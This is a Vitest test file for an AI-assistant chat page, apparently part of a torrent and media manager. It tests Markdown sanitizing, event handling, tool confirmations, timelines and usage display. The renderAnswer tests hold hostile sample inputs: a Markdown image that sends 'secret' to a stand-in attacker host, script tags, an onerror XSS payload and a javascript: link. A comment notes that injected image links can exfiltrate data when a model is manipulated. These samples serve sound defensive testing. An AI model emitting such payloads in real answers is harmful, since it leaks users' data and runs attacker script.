// @vitest-environment happy-dom
/*
 * 钉子：AI 助手页的纯函数。回答的 Markdown 不留图片与脚本（模型被带偏时图片地址能把数据带出去）；
 * 事件按序号归并、重复的不再处理、reset 要重新读会话；工具结果与确认按「运行/调用」对上。
 */
import type { AssistantConfirmation, AssistantEvent, AssistantMessage } from "@/api";
import { describe, expect, it } from "vitest";

import {
  applyEvent,
  argsText,
  attachProblem,
  type ChatTurn,
  chatItems,
  chatStateFrom,
  ASSISTANT_PROVIDERS,
  convGroup,
  convTime,
  durationText,
  fileTypeOf,
  liveHeadline,
  pendingConfirmations,
  processSteps,
  processSummary,
  providerOf,
  renderAnswer,
  renderPartial,
  resultPreview,
  resultText,
  timeline,
  turnAnswer,
  turnMeta,
  usageLines,
  usagePercent,
  usageTone,
} from "./assistant";

function msg(over: Partial<AssistantMessage>): AssistantMessage {
  return { id: 1, role: "user", content: "", created_at: "2026-10-11T08:00:00Z", ...over };
}

function conf(over: Partial<AssistantConfirmation>): AssistantConfirmation {
  return {
    id: 1,
    run_id: "r1",
    tool_call_id: "c1",
    tool: "pause_torrent",
    summary: "暂停种子：下载器 1，任务 abc",
    arguments: {},
    status: "pending",
    expires_at: "2026-10-11T08:10:00Z",
    created_at: "2026-10-11T08:00:00Z",
    ...over,
  };
}

describe("renderAnswer", () => {
  it("留排版，去掉图片、脚本与事件属性；链接在新标签页打开", () => {
    const html = renderAnswer(
      "**下载器**：\n- qb 在线\n\n![x](https://evil.example/p.png?d=secret)\n<script>alert(1)</script>" +
        '<img src=x onerror="alert(1)">\n[详情](https://example.com)',
    );
    expect(html).toContain("<strong>下载器</strong>");
    expect(html).toContain("<li>qb 在线</li>");
    expect(html).not.toContain("evil.example");
    // 原样 HTML 当成文字显示出来，不成为元素
    const box = document.createElement("div");
    box.innerHTML = html;
    expect(box.querySelectorAll("img, script, iframe, style")).toHaveLength(0);
    for (const el of box.querySelectorAll("*")) {
      for (const a of el.getAttributeNames()) expect(a.startsWith("on")).toBe(false);
    }
    expect(box.textContent).toContain("<script>alert(1)</script>");
    const a = box.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("流到一半的「文字 + 换行 + -」不当成标题", () => {
    expect(renderPartial("**结果**：\n-")).not.toContain("<h2");
    expect(renderPartial("**结果**：\n- 第一项")).toContain("<li>");
  });

  it("javascript: 链接不留", () => {
    expect(renderAnswer("[点我](javascript:alert(1))")).not.toContain("javascript:");
  });
});

describe("applyEvent", () => {
  const base = chatStateFrom({
    id: 1,
    title: "t",
    entry: "web",
    running: false,
    created_at: "",
    updated_at: "",
    messages: [msg({ id: 1 })],
    confirmations: [],
    last_seq: 100,
  });

  it("按顺序拼增量；replace 整段替换；回答落库以后清掉进行中的文字", () => {
    let s = applyEvent(base, { seq: 101, type: "run_started", run_id: "r1" })!;
    expect(s.running).toBe(true);
    s = applyEvent(s, { seq: 102, type: "delta", text: "你好" })!;
    s = applyEvent(s, { seq: 103, type: "delta", text: "，世界" })!;
    expect(s.partial).toBe("你好，世界");
    s = applyEvent(s, { seq: 104, type: "delta", text: "全部换掉", replace: true })!;
    expect(s.partial).toBe("全部换掉");
    s = applyEvent(s, {
      seq: 105,
      type: "message",
      message: msg({ id: 2, role: "assistant", content: "最终回答" }),
    })!;
    expect(s.partial).toBe("");
    expect(s.messages.map((m) => m.id)).toEqual([1, 2]);
    s = applyEvent(s, { seq: 106, type: "run_finished", status: "done" })!;
    expect(s.running).toBe(false);
    expect(s.lastSeq).toBe(106);
  });

  it("序号不比 lastSeq 大的事件不再处理（重连时重复送来的）", () => {
    const s = applyEvent(base, { seq: 100, type: "delta", text: "旧的" })!;
    expect(s).toBe(base);
  });

  it("同一条消息、同一个确认按编号更新，不重复", () => {
    let s = applyEvent(base, {
      seq: 101,
      type: "message",
      message: msg({ id: 1, content: "改" }),
    })!;
    expect(s.messages).toHaveLength(1);
    expect(s.messages[0]!.content).toBe("改");
    s = applyEvent(s, { seq: 102, type: "confirmation", confirmation: conf({}) })!;
    s = applyEvent(s, {
      seq: 103,
      type: "confirmation",
      confirmation: conf({ status: "approved" }),
    })!;
    expect(s.confirmations).toHaveLength(1);
    expect(s.confirmations[0]!.status).toBe("approved");
  });

  it("失败时留下原因；reset 要求重新读会话", () => {
    const failed = applyEvent(base, {
      seq: 101,
      type: "run_finished",
      status: "failed",
      error: "模型服务回 401",
    })!;
    expect(failed.error).toBe("模型服务回 401");
    expect(applyEvent(base, { seq: 0, type: "reset", last: 200 } as AssistantEvent)).toBeNull();
  });

  it("推理内容按增量拼；回答落库与运行结束时清掉", () => {
    let s = applyEvent(base, { seq: 101, type: "run_started", run_id: "r1" })!;
    s = applyEvent(s, { seq: 102, type: "reasoning", text: "想" })!;
    s = applyEvent(s, { seq: 103, type: "reasoning", text: "一想" })!;
    expect(s.partialReasoning).toBe("想一想");
    s = applyEvent(s, { seq: 104, type: "reasoning", text: "重来", replace: true })!;
    expect(s.partialReasoning).toBe("重来");
    s = applyEvent(s, {
      seq: 105,
      type: "message",
      message: msg({ id: 2, role: "assistant", reasoning: "重来" }),
    })!;
    expect(s.partialReasoning).toBe("");
    s = applyEvent(s, { seq: 106, type: "reasoning", text: "下一步" })!;
    s = applyEvent(s, { seq: 107, type: "run_finished", status: "done" })!;
    expect(s.partialReasoning).toBe("");
  });

  it("工具开始时记下工具，结果回来以后清掉", () => {
    let s = applyEvent(base, {
      seq: 101,
      type: "tool_started",
      tool: { id: "c1", name: "list_tasks", arguments: "{}" },
    })!;
    expect(s.tool?.name).toBe("list_tasks");
    s = applyEvent(s, {
      seq: 102,
      type: "message",
      message: msg({ id: 3, role: "tool", tool_call_id: "c1", run_id: "r1" }),
    })!;
    expect(s.tool).toBeNull();
  });
});

describe("chatItems", () => {
  const messages = [
    msg({ id: 1, role: "user", content: "暂停", run_id: "r1" }),
    msg({
      id: 2,
      role: "assistant",
      run_id: "r1",
      reasoning: "先找种子",
      tool_calls: [{ id: "c1", name: "pause_torrent", arguments: '{"task_id":"a"}', write: true }],
    }),
    msg({ id: 3, role: "tool", run_id: "r1", tool_call_id: "c1", content: "第一次" }),
    msg({ id: 4, role: "assistant", run_id: "r1", content: "好了", model: "m1", effort: "high" }),
    msg({ id: 5, role: "user", content: "再暂停", run_id: "r2" }),
    msg({
      id: 6,
      role: "assistant",
      run_id: "r2",
      content: "我来暂停",
      tool_calls: [{ id: "c1", name: "pause_torrent", arguments: '{"task_id":"b"}', write: true }],
    }),
    msg({ id: 7, role: "tool", run_id: "r2", tool_call_id: "c1", content: "第二次" }),
    msg({ id: 8, role: "notice", content: "已停止回答。" }),
    msg({ id: 9, role: "assistant", run_id: "r2", content: "" }),
  ];
  const confs = [conf({ id: 1, run_id: "r1" }), conf({ id: 2, run_id: "r2", status: "denied" })];

  it("同一次运行连着的模型消息合成一次回答；工具结果与确认按「运行/调用」对上，编号在两次运行里重复也不串", () => {
    const items = chatItems(messages, confs);
    expect(items.map((i) => i.kind)).toEqual(["user", "turn", "user", "turn", "notice"]);
    const first = items[1] as ChatTurn;
    const second = items[3] as ChatTurn;
    expect(first.steps.map((s) => s.message.id)).toEqual([2, 4]);
    expect(first.steps[0]!.calls[0]!.result?.content).toBe("第一次");
    expect(first.steps[0]!.calls[0]!.confirmation?.id).toBe(1);
    expect(second.steps[0]!.calls[0]!.result?.content).toBe("第二次");
    expect(second.steps[0]!.calls[0]!.confirmation?.status).toBe("denied");
  });

  it("回答是最后一步没有工具调用时的文字；其余的（思考、调用、中间的话）是过程", () => {
    const items = chatItems(messages, confs);
    const first = items[1] as ChatTurn;
    const second = items[3] as ChatTurn;
    expect(turnAnswer(first)).toBe("好了");
    expect(processSteps(first)).toEqual([
      { reasoning: "先找种子", text: "", calls: first.steps[0]!.calls },
    ]);
    expect(processSummary(first)).toBe("已思考 · 调用了 1 个工具");
    expect(turnMeta(first)).toBe("m1 · 推理高");
    // 停在工具上：没有回答，中间的话留在过程里
    expect(turnAnswer(second)).toBe("");
    expect(processSteps(second)[0]!.text).toBe("我来暂停");
  });

  it("多轮工具调用的摘要写明几轮；等确认的单独列出来", () => {
    const turn: ChatTurn = {
      kind: "turn",
      key: "t",
      runId: "r",
      steps: [
        {
          message: msg({ id: 1, role: "assistant" }),
          calls: [
            { call: { id: "a", name: "list_tasks", arguments: "{}" } },
            { call: { id: "b", name: "get_site_userinfo", arguments: "{}" } },
          ],
        },
        {
          message: msg({ id: 2, role: "assistant" }),
          calls: [
            {
              call: { id: "c", name: "push_torrent", arguments: "{}", write: true },
              confirmation: conf({ id: 5, status: "pending" }),
            },
          ],
        },
      ],
    };
    expect(processSummary(turn)).toBe("调用了 3 个工具（2 轮）");
    expect(pendingConfirmations(turn).map((c) => c.id)).toEqual([5]);
  });
});

describe("过程时间线", () => {
  const t0 = Date.parse("2026-10-11T08:00:00Z");
  const at = (sec: number) => new Date(t0 + sec * 1000).toISOString();
  const preview = { id: "a", name: "preview_media_organize", arguments: '{"hash":"abc"}' };
  const organize = { id: "b", name: "organize_media", arguments: '{"hash":"abc"}', write: true };
  const messages = [
    msg({ id: 1, role: "user", content: "把沙丘重新整理一下", run_id: "r1", created_at: at(0) }),
    msg({
      id: 2,
      role: "assistant",
      run_id: "r1",
      reasoning: "先预览一下会放到哪里",
      content: "我先预览",
      created_at: at(4),
      tool_calls: [preview, organize],
    }),
    msg({
      id: 3,
      role: "tool",
      run_id: "r1",
      tool_call_id: "a",
      content: '{"items":[{"target":"/media/沙丘"}],"total":1}',
      created_at: at(4.8),
    }),
  ];
  const turnWith = (confs: AssistantConfirmation[]) => chatItems(messages, confs)[1] as ChatTurn;
  const pending = conf({ id: 7, run_id: "r1", tool_call_id: "b", status: "pending" });

  it("按发生的顺序：思考、中间说的话、工具；思考的用时是这一步与前一条消息的间隔，工具从调用到结果", () => {
    const tl = timeline(turnWith([pending]), true, null);
    expect(tl.map((e) => e.kind)).toEqual(["think", "say", "tool", "tool"]);
    expect(tl[0]!.text).toBe("先预览一下会放到哪里");
    expect(tl[0]!.seconds).toBe(4);
    expect(tl[1]!.text).toBe("我先预览");
    expect(tl[2]!.status).toBe("ok");
    expect(tl[2]!.seconds).toBeCloseTo(0.8);
    expect(tl[3]!.status).toBe("wait");
    expect(tl[3]!.seconds).toBeNull();
  });

  it("进行中：正在生成的思考接在最后；正在执行的工具转圈，没轮到的排队", () => {
    const turn = turnWith([]);
    const tl = timeline(turn, true, { reasoning: "再想想", text: "", tool: organize });
    expect(tl[3]!.status).toBe("running");
    expect(tl[4]).toMatchObject({ kind: "think", text: "再想想", live: true });
    // 开始出正文：思考结束，不再转圈
    const writing = timeline(turn, true, { reasoning: "再想想", text: "答", tool: null });
    expect(writing[4]).toMatchObject({ kind: "think", live: false });
    expect(timeline(turn, true, null)[3]!.status).toBe("queued");
    // 写操作确认以后、结果回来以前也是执行中
    const approved = conf({ ...pending, status: "approved" });
    expect(timeline(turnWith([approved]), true, null)[3]!.status).toBe("running");
  });

  it("回答停了还没有结果的、被拒绝的、确认过期的都算没执行（不是失败）；停了以后不再接正在生成的思考", () => {
    expect(timeline(turnWith([]), false, null)[3]!.status).toBe("skipped");
    const denied = conf({ ...pending, status: "denied" });
    expect(timeline(turnWith([denied]), true, null)[3]!.status).toBe("skipped");
    const expired = conf({ ...pending, status: "expired" });
    expect(timeline(turnWith([expired]), false, null)[3]!.status).toBe("skipped");
    // 服务端给模型写了一条错误结果（「没有执行：确认过期」）也还是没执行
    const withResult = chatItems(
      [
        ...messages,
        msg({
          id: 4,
          role: "tool",
          run_id: "r1",
          tool_call_id: "b",
          content: "确认过期",
          is_error: true,
        }),
      ],
      [expired],
    )[1] as ChatTurn;
    expect(timeline(withResult, false, null)[3]!.status).toBe("skipped");
    const tl = timeline(turnWith([]), false, { reasoning: "残留", text: "", tool: null });
    expect(tl.some((e) => e.live)).toBe(false);
  });

  it("回答那一步的文字不进过程（在下面单独显示），只留它的思考", () => {
    const done = chatItems(
      [
        ...messages,
        msg({
          id: 4,
          role: "assistant",
          run_id: "r1",
          reasoning: "整理好了",
          content: "好了",
          created_at: at(9),
        }),
      ],
      [],
    )[1] as ChatTurn;
    const tl = timeline(done, false, null);
    expect(tl.map((e) => e.kind)).toEqual(["think", "say", "tool", "tool", "think"]);
    expect(tl[4]!.text).toBe("整理好了");
    expect(tl.some((e) => e.text === "好了")).toBe(false);
    expect(turnAnswer(done)).toBe("好了");
    expect(processSummary(done)).toBe("已思考 · 调用了 2 个工具 · 用时 9 秒");
  });

  it("进行中那一行写在做什么", () => {
    const turn = turnWith([]);
    expect(liveHeadline(turn, null, false)).toBe("正在思考… · 已调用 2 个工具");
    expect(liveHeadline(turn, null, true)).toBe("等你确认下面的操作… · 已调用 2 个工具");
    const empty: ChatTurn = { kind: "turn", key: "t", runId: "r", steps: [] };
    expect(
      liveHeadline(
        empty,
        { reasoning: "", text: "", tool: { id: "x", name: "get_site_userinfo", arguments: "{}" } },
        false,
      ),
    ).toBe("正在查看站点数据…");
    expect(liveHeadline(empty, { reasoning: "", text: "答", tool: null }, false)).toBe("正在回答…");
  });

  it("用时：十秒以内留一位小数，一分钟以上写分秒；算不出来或者是 0 时不写", () => {
    expect(durationText(0.83)).toBe("0.8 秒");
    expect(durationText(0.01)).toBe("0.1 秒");
    expect(durationText(12.4)).toBe("12 秒");
    expect(durationText(125)).toBe("2 分 5 秒");
    expect(durationText(120)).toBe("2 分钟");
    expect(durationText(0)).toBe("");
    expect(durationText(null)).toBe("");
  });

  it("工具结果的一行摘要", () => {
    expect(resultPreview("[1,2,3]")).toBe("3 项");
    expect(resultPreview('{"items":[],"total":0}')).toBe("没有记录");
    expect(resultPreview('{"items":[{}],"total":5}')).toBe("共 5 项");
    expect(resultPreview('{"message":"已暂停\\n两个种子"}')).toBe("已暂停 两个种子");
    expect(resultPreview('{"created":2,"failed":1}')).toBe("整理出 2 个文件，失败 1 个");
    expect(resultPreview('{"ok":true}')).toBe("成功");
    expect(resultPreview("站点超时")).toBe("站点超时");
    expect(resultPreview("x".repeat(200)).endsWith("…")).toBe(true);
  });

  it("很长的结果截掉", () => {
    expect(resultText("x".repeat(5000)).length).toBeLessThan(4100);
  });
});

describe("会话列表的分组与时间", () => {
  const now = new Date(2026, 9, 19, 15, 0);
  const local = (...a: [number, number, number, number, number]) => new Date(...a).toISOString();

  it("今天、昨天写时分；近 7 天与更早写月日，不是今年的带年份", () => {
    expect(convGroup(local(2026, 9, 19, 9, 15), now)).toBe("今天");
    expect(convTime(local(2026, 9, 19, 9, 15), now)).toBe("09:15");
    expect(convGroup(local(2026, 9, 18, 0, 0), now)).toBe("昨天");
    expect(convTime(local(2026, 9, 18, 21, 3), now)).toBe("21:03");
    expect(convGroup(local(2026, 9, 13, 0, 0), now)).toBe("近 7 天");
    expect(convTime(local(2026, 9, 15, 8, 0), now)).toBe("10-15");
    expect(convGroup(local(2026, 9, 12, 23, 59), now)).toBe("更早");
    expect(convTime(local(2025, 11, 1, 8, 0), now)).toBe("2025-12-01");
    // 时钟比服务端慢一点：算今天
    expect(convGroup(local(2026, 9, 19, 15, 5), now)).toBe("今天");
    expect(convGroup("不是时间", now)).toBe("更早");
    expect(convTime("不是时间", now)).toBe("");
  });
});

describe("附件", () => {
  it("图片最大 5 MB，文本文件最大 200 KB、只收认识的扩展名", () => {
    const f = (name: string, type: string, size: number) => {
      const file = new File(["x"], name, { type });
      Object.defineProperty(file, "size", { value: size });
      return file;
    };
    expect(attachProblem(f("a.png", "image/png", 1 << 20))).toBe("");
    expect(attachProblem(f("a.png", "image/png", 6 << 20))).toContain("5 MB");
    expect(attachProblem(f("a.log", "", 1000))).toBe("");
    expect(attachProblem(f("a.log", "", 300 << 10))).toContain("200 KB");
    expect(attachProblem(f("a.pdf", "application/pdf", 1000))).toContain("不能发");
    expect(attachProblem(f("a.svg", "image/svg+xml", 1000))).toContain("不能发");
  });

  it("按扩展名给文件卡片的图标", () => {
    expect(fileTypeOf({ name: "a.png", kind: "image" })).toBe("image");
    expect(fileTypeOf({ name: "a.md", kind: "text" })).toBe("mark");
    expect(fileTypeOf({ name: "a.json", kind: "text" })).toBe("code");
    expect(fileTypeOf({ name: "a.csv", kind: "text" })).toBe("excel");
    expect(fileTypeOf({ name: "a.log", kind: "text" })).toBe("txt");
  });
});

describe("其余", () => {
  it("参数写成一行；空参数写「无参数」", () => {
    expect(argsText('{"downloader_id":1,"task_id":"abc"}')).toBe("downloader_id: 1，task_id: abc");
    expect(argsText("{}")).toBe("无参数");
    expect(argsText("不是 JSON")).toBe("不是 JSON");
  });

  it("不认识的服务商当成「其他」", () => {
    expect(providerOf("deepseek").baseURL).toBe("https://api.deepseek.com");
    expect(providerOf("nope").key).toBe("custom");
    // 有免费额度的两家（M20）：地址与 Groq、Google 的 OpenAI 兼容接口一致，都要代理
    expect(providerOf("groq").baseURL).toBe("https://api.groq.com/openai/v1");
    expect(providerOf("google").baseURL).toBe(
      "https://generativelanguage.googleapis.com/v1beta/openai",
    );
    expect(providerOf("google").needsProxy).toBe(true);
    expect(providerOf("google").privacy).toContain("Google");
    // 要 Key 的服务商都给申请 Key 的 https 页面；预设的常用模型不重复
    for (const p of ASSISTANT_PROVIDERS) {
      if (p.key === "custom" || p.noKey) continue;
      expect(p.consoleURL, p.key).toMatch(/^https:\/\//);
      expect(new Set(p.models).size, p.key).toBe(p.models.length);
    }
  });
});

describe("上下文用量", () => {
  const u = {
    context: 51_200,
    window: 128_000,
    window_source: "table" as const,
    auto_compact: true,
    compact_percent: 80,
    input: 120_345,
    output: 8_210,
  };

  it("百分比与颜色：离阈值不到 15 个百分点变黄，到了变红；关了压缩按 100% 算", () => {
    expect(usagePercent(u)).toBe(40);
    expect(usageTone(u)).toBe("ok");
    expect(usageTone({ ...u, context: 85_000 })).toBe("warn");
    expect(usageTone({ ...u, context: 103_000 })).toBe("dang");
    expect(usageTone({ ...u, auto_compact: false, context: 103_000 })).toBe("ok");
    expect(usageTone({ ...u, auto_compact: false, context: 110_000 })).toBe("warn");
    expect(usagePercent({ ...u, window: 0 })).toBe(0);
  });

  it("提示写明上下文、窗口来处、压缩与合计；估算的写「约」，没报用量的说明", () => {
    const lines = usageLines(u);
    expect(lines[0]).toBe("上下文：51,200 / 128,000 token（40%）");
    expect(lines[1]).toContain("按模型名估计");
    expect(lines[2]).toContain("用到 80% 时");
    expect(lines[3]).toBe("本会话共用：输入 120,345 · 输出 8,210 token");
    const est = usageLines({
      ...u,
      estimated: true,
      input: 0,
      output: 0,
      compacted: true,
      auto_compact: true,
    });
    expect(est[0]).toContain("约 51,200");
    expect(est[2]).toContain("压缩过");
    expect(est[3]).toContain("按字数估的");
    expect(usageLines({ ...u, auto_compact: false })[2]).toContain("关闭");
  });

  it("事件：usage 换掉用量；compacting 打开「正在压缩」，下一条提示或运行结束关掉", () => {
    let s = chatStateFrom({
      id: 1,
      title: "",
      entry: "web",
      running: true,
      run_id: "r1",
      created_at: "",
      updated_at: "",
      messages: [],
      confirmations: [],
      last_seq: 1,
      usage: { ...u },
    });
    expect(s.usage?.context).toBe(51_200);
    s = applyEvent(s, { seq: 2, type: "compacting", run_id: "r1" })!;
    expect(s.compacting).toBe(true);
    const empty: ChatTurn = { kind: "turn", key: "t", runId: "r1", steps: [] };
    expect(
      liveHeadline(empty, { reasoning: "", text: "", tool: null, compacting: true }, false),
    ).toBe("正在压缩上下文…");
    s = applyEvent(s, {
      seq: 3,
      type: "message",
      message: msg({ id: 9, role: "notice", content: "已经压缩成摘要" }),
    })!;
    expect(s.compacting).toBe(false);
    s = applyEvent(s, { seq: 4, type: "usage", usage: { ...u, context: 900, compacted: true } })!;
    expect(s.usage?.context).toBe(900);
    s = applyEvent(s, { seq: 5, type: "compacting" })!;
    s = applyEvent(s, { seq: 6, type: "run_finished", status: "done" })!;
    expect(s.compacting).toBe(false);
  });
});
